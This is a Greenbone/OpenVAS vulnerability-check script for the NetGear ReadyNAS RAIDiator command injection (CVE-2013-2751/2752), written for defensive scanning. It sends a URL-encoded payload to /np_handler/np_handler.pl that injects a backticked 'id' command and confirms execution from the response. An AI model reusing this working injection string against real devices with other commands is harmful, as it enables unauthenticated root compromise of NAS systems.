# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:apache:http_server";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103822");
  script_version("2025-03-11T05:38:16+0000");
  script_cve_id("CVE-2013-2751", "CVE-2013-2752");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2025-03-11 05:38:16 +0000 (Tue, 11 Mar 2025)");
  script_tag(name:"creation_date", value:"2013-10-25 15:00:37 +0200 (Fri, 25 Oct 2013)");
  script_name("NetGear RAIDiator (ReadyNAS) CSRF And Command Injection Vulnerabilities (Oct 2013) - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_apache_http_server_consolidation.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("apache/http_server/http/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/62059");

  script_tag(name:"summary", value:"NetGear RAIDiator is prone to a cross-site request forgery
  (CSRF) vulnerability and a command injection vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request which tries to execute the
  'id' command.");

  script_tag(name:"insight", value:"The NETGEAR ReadyNAS RAIDiator firmware prior to the 4.2.24
  release is prone to remote command execution through the FrontView web interface. An attacker can
  use an unauthenticated HTTP GET request to execute arbitrary commands as user 'admin' on the
  remote NAS device. This vulnerability exists due to a failure in /frontview/lib/np_handler.pl to
  sanitize user-input. Due to various improper file system permissions, the admin user can execute
  commands as root.");

  script_tag(name:"impact", value:"Exploiting these issues may allow a remote attacker to perform
  certain administrative actions and execute arbitrary shell commands with root privileges. Other
  attacks are also possible.");

  script_tag(name:"affected", value:"The following versions are vulnerable:

  - RAIDiator versions prior to 4.1.12 running on SPARC

  - RAIDiator-x86 versions prior to 4.2.24");

  script_tag(name:"solution", value:"Updates are available. Please see the references or vendor
  advisory for more information.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(cpe:CPE, port:port, nofork:TRUE))
  exit(0);

# nb: Should be always before http_get_remote_headers() or http_vuln_check()
host = http_host_name(port:port);

banner = http_get_remote_headers(port:port);
if("apache" >!< tolower(banner))
  exit(0);

url = "/np_handler/";

if(http_vuln_check(port:port, url:url, pattern:"Empty No Support")) {

  cmd = "id";

  foreach file(make_list("$html_payload_header", "$xml_payload_header")) {
    url = "/np_handler/np_handler.pl?OPERATION=get&OUTER_TAB=tab_myshares&PAGE=User&addr=%22%29%3b" + file + "=%28%60" + cmd + "%60%29%3b%23";
    if(buf = http_vuln_check(port:port, url:url, pattern:"uid=[0-9]+.*gid=[0-9]+")) {
      data = 'It was possible to execute the "id" command.\n\nRequest:\n\nhttp://' + host + url + '\n\nResponse:\n\n' + buf;
      security_message(port:port, data:data);
      exit(0);
    }
  }
  exit(99);
}

exit(0);
